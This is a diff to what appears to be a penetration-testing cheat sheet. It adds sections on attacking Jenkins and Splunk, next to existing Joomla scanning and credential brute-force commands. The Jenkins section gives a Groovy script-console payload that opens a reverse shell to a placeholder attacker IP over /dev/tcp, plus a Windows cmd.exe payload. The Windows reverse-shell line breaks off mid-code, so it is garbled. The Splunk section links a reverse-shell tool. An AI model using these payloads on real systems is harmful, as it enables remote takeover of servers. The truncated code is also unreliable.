@@ -1039,6 +1039,22 @@ $ droopescan scan joomla --url <URL>
 $ sudo python3 joomla-brute.py -u <URL> -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr users.txt
 ```
 
+- Jenkins
+
+```
+# Linux Groovy script console payload
+r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP address>/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()
+# Windows Groovy script console payload
+def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");
+String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);
+```
+
+- Splunk
+
+```
+https://github.com/0xjpuff/reverse_shell_splunk
+```
+
 - PRTG Network Monitor
 
 ```
